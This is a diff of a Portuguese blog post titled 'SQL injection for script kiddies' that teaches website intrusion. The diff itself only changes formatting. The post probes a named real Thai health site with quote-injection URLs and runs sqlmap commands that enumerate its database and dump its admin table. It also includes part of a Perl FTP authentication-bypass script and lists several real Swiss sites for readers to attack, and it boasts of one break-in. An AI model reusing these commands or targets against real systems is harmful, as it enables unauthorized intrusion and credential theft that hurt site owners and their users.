@@ -3,15 +3,15 @@ layout: post
 title: "SQL injection for script kiddies"
 ---
 
-> Estas anotações foram realizadas alguns anos atrás. O objetivo aqui é detalhar, de forma superficial, os procedimentos utilizados pela grande maioria dos defacers que lotam o Zone-H de "notify". Os sites referenciados já não existem ou tiveram as falhas corrigidas.
+> Estas anotações foram realizadas alguns anos atrás. O objetivo aqui é detalhar, de forma superficial, os procedimentos utilizados pela grande maioria dos defacers que lotam o Zone-H de "notify"'s. Os sites referenciados já não existem ou tiveram as falhas corrigidas.
 
 Primeiramente, porque "*injeção de SQL*"?
 
-Na maioria das vezes quando se tem uma aplicação (seja desktop, mobile ou Web) interagindo com um banco de dados, o usuário não precisa em nenhum momento se preocupar em COMO essa aplicação está lidando com o banco (e nem precisa saber que há um banco de dados ali).
+Na maioria das vezes, quando se tem uma aplicação (seja desktop, mobile ou Web) interagindo com um banco de dados, o usuário não precisa em nenhum momento se preocupar em COMO essa aplicação está lidando com o banco (e nem precisa saber que há um banco de dados ali).
 
 A ideia de se "injetar SQL" é o ato de fornecer fragmentos (ou até mesmo QUERYs completas) de código SQL na aplicação vulnerável, de modo com que uma autenticação ou uma simples consulta ao banco seja maliciosamente modificada. Portanto, SQL Injection não é falha no SGBD, mas sim na APLICAÇÃO que se utiliza do SGDB.
 
-A forma como o código SQL será escrito no processo de injeção vai depender do SGBD utilizado pelo sistema-vítima. Ex: MySQL Injection, PostgresSQL Injection, MSSQLi... ;
+A forma como o código SQL será escrito no processo de injeção vai depender do SGBD utilizado pelo sistema-vítima. Ex: MySQL Injection, PostgresSQL Injection, MSSQLi...
 
 Basicamente, um ataque de SQL Injection em um sistema WEB pode ser realizado de duas maneiras diferentes:
 
@@ -37,7 +37,11 @@ Exemplos de outros sites:
 
 **SQLi Avançado**: nesse caso, a injeção acontecerá diretamente na URL do site por requisição GET (em situações mais convencionais, mas existe também a possibilidade de se atacar por meio de POST - porque não?). O diferencial deste ataque com relação ao anterior é que você irá interagir com o banco de dados até conseguir o login e a senha armazenado nele.
 
-Exemplo, olha esse site da Tailândia: http://www.thailandquitline.or.th/news.php?id=58
+Exemplo, olha esse site da Tailândia:
+
+```
+http://www.thailandquitline.or.th/news.php?id=58
+```
 
 Legal, né?
 
@@ -50,7 +54,9 @@ Esses valores são identificadores de dados armazenados no banco. De certa forma
 
 Se você acrescentar uma aspa simples junto ao id, você poderá ver uma mensagem de erro retornada:
 
+```
 http://www.thailandquitline.or.th/news.php?id=60'
+```
 
 Isso aconteceu porque a consulta feita pelo news.php para o banco de dados foi 'corrompida'. Uma vez que o número passado para a variável id continha um código SQL (o aspa ' ). Isso é um bom sinal. Indo mais além olhe isto, jovem:
 
@@ -133,12 +139,13 @@ $ftp->login("$user","$pass") or die "\n\n[!] Couldn't ByPass The authentication 
 print "\n[*] Connected To $host";
 ```
 
-Baixando e executando o SQLMap:
+
+
+#### Usando o SQLMap
 
 Link para Download: https://codeload.github.com/sqlmapproject/sqlmap/legacy.tar.gz/master
 
 Você fará o download de um arquivo com esse nome: sqlmapproject-sqlmap-0.9-4059-ge35c7fb.tar.gz
-
 
 Descompactando:
 
@@ -149,13 +156,13 @@ $ tar -zxvf sqlmapproject-sqlmap-0.9-4059-ge35c7fb.tar.gz
 Entrando no diretório gerado após a descompactação:
 
 ```
-cd sqlmapproject-sqlmap-e35c7fb
+$ cd sqlmapproject-sqlmap-e35c7fb
 ```
 
 Executando o SQLmap:
 
 ```
-python sqlmap.py
+$ python sqlmap.py
 ```
 
 Ele vai te retorna isso:
@@ -173,7 +180,7 @@ $ python sqlmap.py -h
 Para verificar se um site está vulnerável, você poderá usar o parâmetro -u (de URL):
 
 ```
-python sqlmap.py -u http://www.thailandquitline.or.th/news.php?id=1
+$ python sqlmap.py -u http://www.thailandquitline.or.th/news.php?id=1
 ```
 
 Ele vai realizar uma série de testes. Antes de começar cada teste ele vai te perguntar se você quer ou não que ele faça, siga fazendo as sugestões dele. [Y/n] para Sim, [y/N] para não.
@@ -209,32 +216,32 @@ Obs: Perceba que com -D eu especifico a database, e --tables dizemos ao SQLMap q
 Ele vai nos retornar algo como isto:
 
 ```
-     web application technology: Apache 2, PHP 5.2.17
-     back-end DBMS: MySQL 5.0.11
-     Database: admin_nd
-     [20 tables]
-     +--------------------------+
-     | admin              
-     | admin_module  
-     | callback_patientschronic
-     | callback_recipients     
-     | captcha
-     | contact
-     | contact_data
-     | customer     
-     | email           
-     | news           
-     | refer            
-     | result_patientschronic
-     | result_recipients      
-     | u_refer_case     
-     | u_refer_follow    
-     | u_refer_member
-     | uquit                
-     | uquit_email      
-     | urefer_email     
-     | vdo                 
-     +--------------------------+
+web application technology: Apache 2, PHP 5.2.17
+back-end DBMS: MySQL 5.0.11
+Database: admin_nd
+[20 tables]
++--------------------------+
+| admin              
+| admin_module  
+| callback_patientschronic
+| callback_recipients     
+| captcha
+| contact
+| contact_data
+| customer     
+| email           
+| news           
+| refer            
+| result_patientschronic
+| result_recipients      
+| u_refer_case     
+| u_refer_follow    
+| u_refer_member
+| uquit                
+| uquit_email      
+| urefer_email     
+| vdo                 
++--------------------------+
 ```
 
 De ante das tabelas enumeradas, cabe agora observar a tabela que possivelmente armazena
@@ -245,7 +252,7 @@ visualizar o conteúdo dela:
 $ python sqlmap.py -u http://www.thailandquitline.or.th/news.php?id=1 -D admin_nd -T admin --dump -v0
 ```
 
-Obs: -D admin_nd -T admin, define que queremos trabalhar com a tabela admin da database admin_nd.
+Obs: **-D** *admin_nd* **-T** *admin*, define que queremos trabalhar com a tabela admin da database admin_nd.
 Obs2: com --dump pedidos para o sqlmap nos mostrar o conteúdo desta tabela.
 
 Resultado:
@@ -265,11 +272,9 @@ Table: admin
 
 Experimente fazer esses procedimentos com esses sites:
 
-http://camping-boomerang.ch/en/news.php?ID=91
-
-http://www.audio-prestige.ch/news/news.php?id=100
-
-http://www.mediations.ch/cms/news.php?id=10
+* http://camping-boomerang.ch/en/news.php?ID=91
+* http://www.audio-prestige.ch/news/news.php?id=100
+* http://www.mediations.ch/cms/news.php?id=10
 
 
 Consegui invadir esse site: http://www.stonetouch.ch/
